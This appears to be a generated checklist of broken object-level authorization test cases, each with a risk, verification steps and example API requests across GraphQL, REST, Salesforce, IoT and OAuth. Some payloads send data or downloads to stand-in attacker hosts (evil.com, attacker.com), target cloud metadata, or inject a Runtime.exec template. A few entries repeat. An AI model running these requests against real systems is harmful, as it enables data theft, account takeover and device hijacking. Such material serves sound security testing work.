target:
Risk: User can delete any document by guessing or enumerating IDs.
Verification: 1. User A creates document, gets id. 2. User B calls deleteDocument(id). 3. If document is deleted, BOLA.
Example queries: mutation { deleteDocument(id: "doc123") { success } }

Risk: Any authenticated user could modify another user's invoice (status, amount) by changing the invoiceId parameter.
Verification: 1. User A creates invoice, notes invoiceId. 2. User B calls PATCH /api/v1/invoices/{invoiceId} with different status. 3. If update succeeds, BOLA on write operation.
Example queries: PATCH /api/v1/invoices/42 {"status": "cancelled"}

Risk: An attacker can forge callback requests with arbitrary orderId values to mark payments as complete (BOLA on write via callback).
Verification: 1. Send POST /api/webhooks/payment-callback with a valid orderId but no gateway signature. 2. Check if the order status changes. 3. If yes, the callback lacks object-level validation.
Example queries: POST /api/webhooks/payment-callback {"orderId": "order789", "status": "paid"}

Risk: Attacker can submit IDs belonging to other tenants and retrieve their data in a single batch call.
Verification: 1. User A (tenant 1) creates objects, notes IDs. 2. User B (tenant 2) calls POST /api/v2/batch/lookup with those IDs. 3. If objects are returned, batch BOLA confirmed.
Example queries: POST /api/v2/batch/lookup {"ids": ["obj-001", "obj-002"]}

Risk: Any authenticated user could read or update any loan by loanId; access any org's settings by orgId; list documents for any loan; or use batch to fetch other tenants' loans (BOLA).
Verification: 1. User A has loan 123. 2. User B calls GET /api/v2/loans/123 and GET /api/v2/loans/123/documents with token B. 3. If user B receives data, BOLA. Same for GET /api/v2/orgs/{orgId}/settings and POST /api/v2/loans/batch with another user's loanIds. Use two different user tokens.
Example queries: GET /api/v2/loans/123; GET /api/v2/orgs/org1/settings; POST /api/v2/loans/batch {"loanIds": ["a", "b"]}

Risk: Any authenticated user can query any user by ID and retrieve profiles (BOLA).
Verification: 1. User A calls query { user(id: "userB-id") { name email } } with token A. 2. User B calls same query with token B. If both receive userB data, BOLA.
Example queries: query { user(id: "123") { name email } }

Risk: If orders resolver does not filter by parent User, a user could receive another user's orders via a different query path or if me is misconfigured.
Verification: 1. As user A, call query { me { orders { id } } }. 2. As user B, call query { user(id: "userA-id") { orders { id } } } if such query exists. 3. If user B receives user A's orders, nested resolver BOLA.
Example queries: query { me { orders { id total } } }

Risk: User can delete any documents by submitting IDs belonging to other users.
Verification: 1. User A creates document, notes id. 2. User B calls mutation { deleteDocuments(ids: ["userA-doc-id"]) }. 3. If document is deleted, batch mutation BOLA.
Example queries: mutation { deleteDocuments(ids: ["doc1", "doc2"]) }

Risk: An attacker intercepts the Aura/GraphQL message and adds restricted fields (e.g., 'IsEscalated__c', 'Internal_Notes__c') to the payload, bypassing frontend read-only attributes.
Verification: 1. Open DevTools while editing a record. 2. Capture the 'executeGraphQL' or 'updateRecord' XHR request. 3. Copy as cURL. 4. Manually add a hidden/system field to the JSON body. 5. If 200 OK and record updates, Mass Assignment/BOLA is confirmed.
Example queries: PATCH /ui-api/records/001... {"fields": {"Name": "New Name", "IsInternalOnly__c": true}}

Risk: The class may update the record without checking 'isUpdateable()' for the current user's profile, allowing any user to edit read-only system fields.
Verification: 1. Identify a field that is Read-Only on the Page Layout. 2. Call the Aura/LWC action that triggers the Apex method. 3. Pass the restricted field value in the params. 4. Check if the DB was updated.
Example queries: Aura Action: c.updateRecord { recordId: '001...', status: 'Approved_By_Admin' }

Risk: The backend 'Step 2' endpoint does not verify that 'Step 1' was actually completed for the specific RecordID, allowing a user to skip directly to the sensitive action.
Verification: 1. Start a process for a record you don't own. 2. Manually trigger the 'Finish' or 'Step 2' network request for that ID. 3. If the change persists, BFLA/BOLA confirmed.
Example queries: POST /api/flow/execute/Step_Final { "recordId": "999" }

Risk: The backend verifies the token is valid but doesn't verify the user is the 'Owner' of that specific {deviceId}. An attacker can poll states or send 'Unlock' commands to any device ID.
Verification: 1. Pair your app with Device A. 2. Capture the 'Unlock' request. 3. Change {deviceId} to Device B (neighbor's ID). 4. If Device B unlocks, BOLA on IoT shadow.
Example queries: PATCH /api/v1/devices/IOT-999/state {"status": "open"}

Risk: Tenant B creates a Work Order and provides Tenant A's AssetId. If the system doesn't check if the Asset is owned by the creator, Tenant B now 'links' to Tenant A's private asset and may see its details in the UI.
Verification: 1. As Tenant B, create a record linked to Tenant A's object ID. 2. If the record saves and shows Tenant A's asset details in the Work Order view, BOLA via Lookup is confirmed.
Example queries: POST /api/work-orders {"AssetId": "tenant-A-id"}

Risk: The operation fails for 'not-my-id', but the error message returns details: 'Cannot delete record: [Victim Name] is the owner'. This leaks the existence and metadata of private records.
Verification: 1. Submit a bulk request containing an ID you don't own. 2. Inspect the 403/500 error response. 3. If it contains data about the record (Names, Statuses), it's an Information Leakage BOLA.
Example queries: POST /api/v2/batch/delete {"ids": ["001abc"] }

Risk: An attacker uses introspection to discover hidden fields and relationships. They then query these fields directly, bypassing the UI's intended data exposure.
Verification: 1. Send a standard introspection query to the endpoint. 2. Search the output for types containing 'Internal', 'Private', or 'Admin'. 3. Craft a query for a Case ID you own but request the 'PrivateInternalNote' field. 4. If data returns, BOLA via Schema Leakage.
Example queries: query { __schema { types { name fields { name } } } }; query { Case(id: "500...") { PrivateInternalNote { body } } }

Risk: The 'Refresh' endpoint doesn't validate that the requested scopes match the original consent. An attacker refreshes the token but requests 'read write' or 'admin' scopes.
Verification: 1. Authenticate with 'read' scope. 2. Call the token refresh endpoint and manually add 'scope=all' to the POST body. 3. If the new Access Token has elevated permissions, BFLA/BOLA via Scope Escalation.
Example queries: POST /oauth/token { "grant_type": "refresh_token", "scope": "admin" }

Risk: While intended for UX, returning 'lastLogin' or masked emails for any username allows an attacker to build a profile and verify the existence of specific high-value targets (User Enumeration/BOLA).
Verification: 1. Submit various usernames to the check-user endpoint. 2. Observe if sensitive metadata (last login, phone fragments) is returned for users you do not own.
Example queries: POST /api/auth/check-user { "username": "admin_user" }

Risk: Intended for support to merge duplicate accounts. If accessible to a user, they can merge *their* account into a *target* account, potentially gaining the target's permissions or viewing their history.
Verification: 1. As User A, call merge with Source=User A and Target=Victim B. 2. If the accounts merge and User A now sees Victim B's data, BFLA/BOLA confirmed.
Example queries: POST /api/v1/users/merge { "source_id": "my_id", "target_id": "victim_id" }

Risk: An attacker provides a URL pointing to the server's local admin API (e.g., http://localhost:8080/admin/users/1). The server, acting as 'system', fetches the private data and returns it in the PDF.
Verification: 1. Submit 'http://127.0.0.1:80/api/internal/stats' to the converter. 2. Download the resulting PDF. 3. If internal system metrics or other users' session counts appear, SSRF-to-BOLA is confirmed.
Example queries: POST /api/v1/convert-to-pdf {"url": "http://169.254.169.254/latest/meta-data/"}

Risk: The system validates that the 'callbackUrl' is reachable but doesn't verify if the logged-in user owns 'accountId: 123'. An attacker can subscribe to payment notifications for any company on the platform.
Verification: 1. Log in as User A. 2. Call the subscribe endpoint with User B's accountId. 3. Trigger an event in User B's account (e.g., make a purchase). 4. If attacker.com receives the webhook data, BOLA on Event Subscriptions.
Example queries: POST /api/webhooks/subscribe {"accountId": "victim-789", "url": "https://evil.com"}

Risk: An attacker uses aliases to request 100 different Record IDs at once. The backend check might only validate the *first* alias against the user's session, or it might fail to perform individual ownership checks for each aliased node.
Verification: 1. Craft a GraphQL query with two aliases: 'mine' (own ID) and 'notMine' (victim ID). 2. If both return data in one response, BOLA via Alias Batching.
Example queries: query { a: Case(id:"my-id"){Subject} b: Case(id:"victim-id"){Subject} }

Risk: A user changes the 'ContactId' or 'AccountId' on a record they *already* own to point to a different Account. If the system doesn't block this 're-parenting', the Sharing Set might suddenly grant them access to all other records in that victim Account.
Verification: 1. As a Portal User, edit your own Case. 2. Change the Account lookup to 'Big Corp' (Victim). 3. Check if you can now see other 'Big Corp' cases via the 'Recent' list. 4. If yes, BOLA via Parent Injection.
Example queries: PATCH /services/data/vXX.X/sobjects/Case/MyID {"AccountId": "VictimAccountID"}

Risk: The 'Stamping' service modifies the file. If it doesn't check 'docId' ownership, an attacker can overwrite or deface any document in the system, including legal contracts they don't own.
Verification: 1. Identify a docId of a victim. 2. Call the annotate API with that ID. 3. If the document is modified or the API returns 'Success', BOLA on write-access.
Example queries: POST /api/docs/victim-contract-001/annotate {"text": "VOID"}

Risk: An attacker invites *themselves* to a private projectId. If the system doesn't check if the 'Inviter' is an Admin of that project, anyone can join any project.
Verification: 1. Log in as User A (not in Project X). 2. Call the 'invites' endpoint for Project X with your own email. 3. If you receive an invite or are added, BOLA/BFLA on the Membership function.
Example queries: POST /api/projects/private-project-99/invites {"email": "attacker@gmail.com"}

Risk: The server trusts the client-provided value for '$isAdmin' to determine field visibility instead of calculating the role server-side from the session token. An attacker sets 'isAdmin: true' in their variables to extract sensitive fields.
Verification: 1. Query a User node. 2. Manually add '$isAdmin: true' to the variables object in the request. 3. If the 'ssn' or 'salary' field returns data, BOLA via Directive Injection.
Example queries: query($isAdmin: Boolean!){ User(id:"123"){ name ssn @include(if: $isAdmin) } }; Variables: {"isAdmin": true}

Risk: The 'Clone' logic reads the source project and writes a new one. If it doesn't check if the user has 'Read' access to the source {id}, any user can clone a private project into their own workspace to read its contents.
Verification: 1. Obtain a private Project ID (User A). 2. As User B, call the /clone endpoint with User A's ID. 3. If the project is cloned successfully into User B's account, BOLA via Clone functionality.
Example queries: POST /api/projects/victim-99/copy {}

Risk: The server fetches 'reportId' and uploads it. If it doesn't verify the user owns 'reportId', it acts as a 'Confused Deputy', sending private reports to the attacker's Dropbox.
Verification: 1. Call the 'Save to Dropbox' API. 2. Provide a Victim's reportId and *your own* Dropbox token. 3. Check your Dropbox for the file. 4. If present, BOLA via Integration Confusion.
Example queries: POST /api/export/dropbox {"reportId": "victim-report", "token": "attacker-token"}

Risk: The backend assumes 'Persisted Queries' are safe and skips some authorization middleware. If an attacker knows the hash for 'getAdminStats', they can call it with any {id} variable.
Verification: 1. Find a sensitive query hash in the frontend JS bundle. 2. Execute the GET request with that hash and a victim's ID. 3. If data returns, BOLA via Persisted Query Trust.
Example queries: GET /graphql?hash=SECRET_ADMIN_HASH&variables={"userId":"999"}

Risk: An attacker points the 'kid' to a file they control (e.g., /dev/null or a public URL) or uses a known 'test' key. If the service trusts the 'kid' and verifies the token against the attacker's key, the attacker can claim any 'userId' or 'orgId'.
Verification: 1. Modify a JWT 'sub' (subject) to a victim ID. 2. Change 'kid' to a URL pointing to your own public key. 3. If the API accepts the token, BOLA via Signature Confusion.
Example queries: Header: {"alg":"RS256","kid":"https://attacker.com/key.json"}

Risk: An attacker adds a high-privileged UserID (like an Admin) to a project they control. If the system doesn't require the *invitee* to accept, the attacker might gain access to data 'shared' with that Admin or leak the Admin's private profile data.
Verification: 1. Create a dummy team. 2. Call the 'add member' API with the Admin's known UserID. 3. If the Admin is added without consent, BOLA via Membership Injection.
Example queries: POST /api/teams/my-team/members {"userId": "admin-uuid"}

Risk: The server exports 'reportId' (which might be a victim's) to a bucket provided by the user. The server has a 'Service Role' that can write to any bucket. This bypasses the report's intended boundary.
Verification: 1. Provide a victim's 'reportId'. 2. Set 'destinationBucket' to a bucket you control. 3. If the file arrives in your bucket, BOLA via Confused Deputy.
Example queries: POST /api/export {"id": "victim-data", "bucket": "attacker-owned-s3"}

Risk: The initial 'Connect' validates the user, but the 'Subscribe' action does not verify if the user owns the specific 'id' (Order 123). An attacker receives real-time push notifications (status, price, customer notes) for any order ID.
Verification: 1. Open a WebSocket connection. 2. Send a subscribe message for a Victim's Order ID. 3. Trigger a status change in the Victim's account. 4. If the attacker's console logs the update, BOLA via WebSocket Subscriptions.
Example queries: WS: {"action": "subscribe", "topic": "account_activity", "id": "victim-user-001"}

Risk: If the gRPC service trusts the 'user-id' metadata header without checking it against the 'accountId' requested in the Protobuf message, an attacker who can bypass the gateway (or exploit a misconfigured one) can read any account.
Verification: 1. Use a gRPC client (like Postman/Evans). 2. Call GetUserAccount with 'accountId: 999'. 3. Provide a valid 'user-id: 101' in the metadata. 4. If account 999 returns, BOLA on the gRPC implementation.
Example queries: gRPC: GetUserAccount { "id": "target-account-id" }

Risk: The API generates a reset token and sends it via email. However, the *response* of the API call itself returns the reset token in the JSON for 'debugging' or 'UX' purposes.
Verification: 1. Trigger a password reset for a Victim's email. 2. Inspect the JSON response of the POST request. 3. If a 'token' or 'resetUrl' is present in the response body, BOLA/BFLA via Information Leakage.
Example queries: POST /api/auth/forgot-password {"email": "ceo@company.com"}

Risk: The 'inherited sharing' class will run 'without sharing' because it inherits the context of the caller. If this utility performs a sensitive delete or update based only on a passed ID, it bypasses all row-level security.
Verification: 1. Identify a utility method used for 'Cleanup' or 'Reset'. 2. Call the parent Portal Action with a Record ID belonging to another user. 3. If the record is modified/deleted, BOLA via Context Inheritance confirmed.
Example queries: Aura Action: c.performCleanup { targetId: '500cT00000Victim' }

Risk: An attacker registers a new account but provides a high-value 'accountId' (e.g., a competitor or a government agency). If the system doesn't validate the email domain against the accountId, the attacker gains 'Member' access to that account's data.
Verification: 1. Find a target Account ID. 2. Register a new user with a generic email (Gmail) but provide the target Account ID. 3. If the user is created and can see 'Account Cases', BOLA on Registration logic.
Example queries: POST /api/v1/register {"email": "attacker@mail.com", "accountId": "001_TARGET_ID"}

Risk: The query root checks Account access, but the resolver for the 'Contacts' relationship doesn't apply a second check for 'Contact' sharing, allowing a user to see 'Private' contacts in a shared Account.
Verification: 1. Query a shared Account. 2. Request the 'Contacts' edges. 3. Compare with UI results. 4. If the list contains more contacts than the UI, BOLA via Relationship Resolver.
Example queries: query { uiapi { query { Account(where: {Id: {eq: "001..."}}) { edges { node { Contacts { edges { node { Name { value } } } } } } } } } }

Risk: An attacker updates the security questions of a *target* user by changing the {userId}. Once updated, the attacker uses the 'Forgot Password' flow to take over the account using their own known answers.
Verification: 1. Note Target User ID. 2. Call PATCH with your own session but Target ID. 3. If 'Success' returns, BOLA on User Settings write-access.
Example queries: PATCH /api/v1/users/victim-uuid/security-questions {"questions": [{"q": "Pet", "a": "hacked"}]}

Risk: The system validates the 'code' is correct but doesn't check if the 'code' was actually sent to the user associated with {userId}. An attacker uses their own valid code to 'verify' a victim's account.
Verification: 1. Request a code for your account. 2. Call the verify endpoint but provide a Victim's userId and *your* code. 3. If the victim's account becomes 'Verified', BOLA on Auth state.
Example queries: POST /api/v1/auth/verify {"userId": "victim-99", "code": "MY_VALID_CODE"}

Risk: The editor frontend hides 'Admin' layers, but the API accepts any layer ID in the PATCH body. A regular user can edit or delete 'Admin-only' annotations on a shared document.
Verification: 1. Identify an Admin-layer ID in a shared doc. 2. Call the PATCH endpoint for that docId. 3. Modify the text of the admin layer. 4. If saved, BOLA on document sub-resources.
Example queries: PATCH /api/docs/doc-123/layers/admin-layer-5 {"text": "DELETED"}

Risk: An attacker can iterate through different {teamId} values and attempt to invite themselves. If the system returns 'User already invited' or 'User is already a member of this team', it leaks the membership list of private teams.
Verification: 1. Identify a private Team ID. 2. Attempt to invite a known target email. 3. If the response confirms membership status without the attacker being an owner, BOLA via membership leak.
Example queries: POST /api/v1/teams/internal-finance-99/invites {"email": "ceo@company.com"}

Risk: The backend validates that the 'token' is a valid, active reset token, but it does not verify that the token belongs specifically to the {userId} provided in the body. An attacker uses their own token to reset a victim's password.
Verification: 1. Request a password reset for your own account (Attacker). 2. Capture the token. 3. Call the reset endpoint using your token but the Victim's userId. 4. If the victim's password changes, BOLA on the Auth state logic.
Example queries: POST /api/v1/auth/reset-password {"token": "ATTACKER_TOKEN", "userId": "VICTIM_ID"}

Risk: A user triggers a background export of a report they do not own and directs the output to their own webhook listener. The backend 'Service Account' processes the report and sends it to the attacker.
Verification: 1. Find a sensitive Report ID. 2. Call the webhook export API with your own listener URL. 3. If the report data is POSTed to your server, BOLA via integration.
Example queries: POST /api/v1/exports/webhook {"reportId": "999", "url": "https://evil.sh"}

Risk: The backend checks if the device is 'Online' but doesn't check if the requester is the registered owner or authorized 'Family Member' of that device.
Verification: 1. Identify a target deviceId. 2. Send a 'shutdown' or 'factory-reset' command. 3. If the device responds, BOLA on IoT Command gateway.
Example queries: POST /api/v1/devices/smart-lock-123/commands {"cmd": "unlock"}

Risk: An attacker uses a 'Subdomain' or 'Alias' (e.g., attacker@company.com.evil.sh) or exploits a weak regex in the backend to invite themselves to a private organization.
Verification: 1. Identify target Org ID. 2. Attempt to invite an email like 'myname@target.com.attacker.com'. 3. If the invitation is sent and grants access, BOLA/BFLA on the Invitation gateway.
Example queries: POST /api/v1/orgs/99/invites {"email": "user@target.com.evil.sh"}

Risk: The server downloads 'fileId' (victim's) and uploads it to the user's Dropbox. The server acts as a 'Confused Deputy' because it has permission to read all files, but fails to check if the *requester* has that permission.
Verification: 1. Link your Dropbox to the app. 2. Request an upload for a File ID you don't own. 3. Check your Dropbox. 4. If the file is there, BOLA via integration.
Example queries: POST /api/v1/integrations/dropbox/upload {"fileId": "secret-doc-99"}

Risk: The API returns 'Last Seen' and 'User_Email' of the device owner to the requester. An attacker pings a list of MAC addresses to build a map of user locations and device owners.
Verification: 1. Send a ping for a MAC address you don't own. 2. Inspect the response JSON. 3. If it returns 'Owner: John Doe', BOLA on device metadata.
Example queries: POST /api/v1/devices/ping {"mac": "FF:FF:FF:FF:FF:FF"}

Risk: The server posts 'reportId' (victim's) to a Slack channel the attacker controls. The server's 'Slack Bot' has global read access to reports but doesn't check the human requester's permission for that report.
Verification: 1. Trigger Slack export. 2. Provide a private Report ID you don't own. 3. Check your Slack. 4. If the report file appears, BOLA via Integration.
Example queries: POST /api/v1/export/slack {"id": "victim-report-99", "channel": "attacker-channel"}

Risk: The API returns 'Last Seen' and the 'User_Email' of the device owner to the requester for troubleshooting. An attacker pings a list of MAC addresses to build a map of user locations and device owners.
Verification: 1. Send a ping for a MAC address you don't own. 2. Inspect the response JSON. 3. If it returns 'Owner: John Doe', BOLA on device metadata.
Example queries: POST /api/v1/devices/ping {"mac": "FF:FF:FF:FF:FF:FF"}

Risk: The server posts 'reportId' (victim's) to a Slack channel the attacker controls. The server's 'Slack Bot' has global read access to reports but doesn't check the human requester's permission for that report.
Verification: 1. Trigger Slack export. 2. Provide a private Report ID you don't own. 3. Check your Slack. 4. If the report file appears, BOLA via Integration.
Example queries: POST /api/v1/export/slack {"id": "victim-report-99", "channel": "attacker-channel"}

Risk: An attacker can turn off 'auto_renew' for any user's subscription by guessing the {subscriptionId}, causing a Denial of Service (service cancellation) for the victim.
Verification: 1. Find a subscriptionId for another user. 2. Send a PATCH request to disable renewal. 3. If the server responds 200 OK, BOLA on write-access.
Example queries: PATCH /api/v1/billing/subs/sub-12345 {"auto_renew": false}

Risk: The {settingId} is tied to an employee. An attacker changes the {settingId} to a victim's ID and updates the bank details to their own, redirecting the victim's next paycheck.
Verification: 1. Capture your own payroll update request. 2. Change {settingId} to a victim's ID. 3. If the server accepts the change, BOLA on critical financial settings.
Example queries: PUT /api/v1/hr/payroll/settings/user-9988 {"bank_account": "ATTACKER_IBAN"}

Risk: An attacker changes the polling station or mailing address for a list of voters by guessing {recordId}, potentially interfering with election logistics.
Verification: 1. Log in to your voter portal. 2. Send a PATCH request with a different recordId. 3. If the server accepts the change for a record you don't own, BOLA on civic data.
Example queries: PATCH /api/v1/gov/voters/rec-55221 {"mailing_address": "attacker_address"}

Risk: An attacker edits a 'Shared' template they shouldn't have write-access to (BOLA). They inject an OS command expression (e.g., `${run('/bin/sh')}`). When an Admin renders that template, the server executes the attacker's code.
Verification: 1. Identify a Template ID owned by Admin. 2. Call PATCH /templates/{id} with a malicious payload. 3. If 200 OK, trigger the render API. 4. If the server opens a reverse shell, BOLA-to-RCE confirmed.
Example queries: PATCH /api/v1/templates/global-header {"content": "${T(java.lang.Runtime).getRuntime().exec('id')}"}

Risk: An attacker pushes a malicious firmware URL to a deviceId they don't own. The device downloads the 'update', turning it into a botnet node for a DDoS attack.
Verification: 1. Target a deviceId. 2. Call the update API with a controlled URL. 3. If the device attempts to fetch the file, BOLA-to-IoT Hijacking.
Example queries: POST /api/v1/iot/firmware/dev-7766/update {"url": "http://attacker.com/malicious.bin"}

Risk: The system allows 'Reviewers' to mark logs as reviewed. If they can change the status of *any* log entry (including those detailing their own suspicious activity), they can cover their tracks (Anti-Forensics).
Verification: 1. Perform a malicious action. 2. Find the logEntryId. 3. PATCH the log entry to change its 'Severity' or 'Description'. 4. If saved, BOLA on Audit Integrity.
Example queries: PATCH /api/v1/security/logs/log-8821 {"severity": "Low", "note": "False Positive"}

Risk: An attacker finds the {tenantId} of a target company. They call the 'Add User' API. If the system doesn't check if the requester is already an Admin *within that specific tenantId*, the attacker adds themselves as a Global Admin of the victim company.
Verification: 1. Obtain Target Tenant ID. 2. Call the 'Add User' API with your email and 'role':'Admin'. 3. If you gain access to the victim's dashboard, BOLA on Tenant isolation.
Example queries: POST /api/v1/multi-tenant/org-victim-01/users {"email": "hacker@mail.com", "role": "SuperAdmin"}
